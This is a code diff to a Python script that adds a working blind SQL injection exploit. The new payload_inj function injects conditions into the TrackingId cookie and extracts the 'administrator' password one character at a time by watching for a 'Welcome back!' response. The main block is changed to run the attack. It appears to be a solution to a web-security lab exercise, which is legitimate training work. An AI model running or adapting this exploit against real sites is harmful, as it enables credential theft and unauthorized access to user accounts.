@@ -3,8 +3,9 @@ import difflib
 from bs4 import BeautifulSoup
 
 session = requests.Session()
+CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
-base_url = 'Your url'
+base_url = 'url'
 
 def post_injection():
     resp = session.get(base_url)
@@ -24,13 +25,13 @@ def post_injection():
     print(response.history)
 
 def simple_sql_injection():
-    url_response = requests.get(base_url)
+    url_response = session.get(base_url)
     text1 = url_response.text.splitlines()
 
     sql_injection = "sql injection"
-    replased = sql_injection.replace(" ","%20")
-    injection = base_url+replased
-    injection_request = requests.get(injection)
+    replaced = sql_injection.replace(" ","%20")
+    injection = base_url+replaced
+    injection_request = session.get(injection)
     text2= injection_request.text.splitlines()
 
     diff = difflib.ndiff(text1, text2)
@@ -40,8 +41,44 @@ def simple_sql_injection():
             print(lines)
 
 def show_text():
-    url_response = requests.get(base_url)
+    url_response = session.get(base_url)
     print(url_response.text)
+    print(url_response.cookies)
+
+
+def payload_inj(lang_pass, username):
+    url_response = session.get(base_url)
+    cookies = url_response.cookies
+
+    tracking_id_cookies = cookies["TrackingId"]
+    session_id = cookies["session"]
+    res = ""
+
+    for i in range(1, lang_pass + 1):
+        for j in CHAR_LIST:
+            payload = f"{tracking_id_cookies}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {i}, 1) = '{j}'--"
+
+            cookies_injection = {
+                "TrackingId": payload,
+                "session": session_id
+            }
+            try:
+                response = session.get(base_url, cookies=cookies_injection)
+
+                if "Welcome back!" in response.text:
+                    res += j
+                    print(f"[+] Latter find {i}: {j} | Password: {res}")
+                    break
+
+            except requests.exceptions.RequestException as e:
+                print(e)
+
+        else:
+            print("Can't find a latter")
+            break
+
+
+
 
 if __name__ == "__main__":
-    show_text()
+    payload_inj(20, "administrator")
